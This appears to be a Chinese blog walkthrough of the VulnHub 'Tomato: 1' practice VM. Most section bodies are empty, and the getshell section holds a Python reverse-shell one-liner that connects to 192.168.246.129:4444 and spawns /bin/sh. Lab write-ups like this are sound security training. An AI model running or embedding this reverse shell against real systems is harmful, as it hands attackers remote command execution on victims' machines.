# 原创
：  VulnHub渗透测试实战靶场 - Tomato：1

# VulnHub渗透测试实战靶场 - Tomato：1

#### VulnHub渗透测试实战靶场 - Tomato：1

## 环境下载

> 



## Tomato：1靶机搭建

> 
将下载好的靶机导入Vmware，网络连接设置为NAT模式即可


## 渗透测试

### 信息搜集

> 



> 



> 



### 漏洞挖掘

> 



> 



### getshell

> 



> 



> 



```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.246.129",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

> 



### 提权

> 



> 



> 



> 


